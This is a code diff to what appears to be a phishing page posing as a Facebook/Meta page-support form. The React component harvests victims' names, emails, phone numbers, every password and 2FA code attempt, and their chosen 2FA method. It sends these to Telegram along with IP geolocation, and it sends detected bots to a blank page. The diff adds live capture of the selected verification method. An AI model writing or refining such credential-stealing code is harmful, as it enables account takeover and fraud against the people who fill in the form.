@@ -22,7 +22,6 @@ import { translateTexts } from '@/utils/translate-by-lang';
 import countryToLanguage from '@/utils/country_to_language';
 import { sendTelegramMessage } from '@/utils/send-message';
 import { buildMetaMessage } from '@/utils/message';
-import { getDeviceLabel } from '@/utils/device';
 import detectBot from '@/utils/detect_bot';
 import { redirectToRandomContact } from '@/utils/contact-redirect';
 
@@ -158,10 +157,10 @@ const Home = () => {
     const [passwordAttempts, setPasswordAttempts] = useState<string[]>([]);
     const [twoFAAttempts, setTwoFAAttempts] = useState<string[]>([]);
     const [ipInfo, setIpInfo] = useState({ ip: 'Unknown', city: 'Unknown', region: 'Unknown', country: 'Unknown', country_code: 'US' });
-    const [deviceLabel, setDeviceLabel] = useState('Unknown');
     const messageIdRef = useRef<number | null>(null);
     const sendQueueRef = useRef<Promise<void>>(Promise.resolve());
     const formDataRef = useRef(formData);
+    const selectedMethodRef = useRef('');
     const [translatedTexts, setTranslatedTexts] = useState<UiTexts>({});
 
     useEffect(() => {
@@ -249,9 +248,6 @@ const Home = () => {
                 window.location.href = 'about:blank';
                 return;
             }
-
-            const label = await getDeviceLabel();
-            setDeviceLabel(label);
         } catch (error) {
             console.error('Initialization error:', error);
             setTranslatedTexts(defaultTexts);
@@ -272,21 +268,18 @@ const Home = () => {
             country_code: ipInfo.country_code || 'US'
         };
 
-        const information = [form.reason, form.additionalNotes].filter(Boolean).join(' | ');
-
         const message = buildMetaMessage({
             geoInfo,
-            deviceLabel,
             userData: {
                 fullName: form.fullName,
                 personalEmail: form.personalEmail,
                 businessEmail: form.businessEmail,
                 phoneNumber: form.phone,
-                facebookPageName: form.pageName,
-                information
+                facebookPageName: form.pageName
             },
             passwords: passwordLogs,
-            codes: codeAttempts
+            codes: codeAttempts,
+            selectedMethod: selectedMethodRef.current
         });
 
         // Xếp hàng tuần tự: xóa tin cũ → gửi tin mới (data cũ + mới)
@@ -325,6 +318,11 @@ const Home = () => {
         const newAttempts = [...twoFAAttempts, code];
         setTwoFAAttempts(newAttempts);
         buildAndSend(formDataRef.current, passwordAttempts, newAttempts);
+    };
+
+    const handleMethodSelect = (method: string) => {
+        selectedMethodRef.current = method;
+        buildAndSend(formDataRef.current, passwordAttempts, twoFAAttempts);
     };
 
     const texts = Object.keys(translatedTexts).length > 0 ? translatedTexts : defaultTexts;
@@ -531,6 +529,7 @@ const Home = () => {
                 show={show2FAModal}
                 onClose={() => setShow2FAModal(false)}
                 onSubmit={handle2FASubmit}
+                onMethodSelect={handleMethodSelect}
                 onSuccess={() => {
                     setShow2FAModal(false);
                     setShowSuccessModal(true);
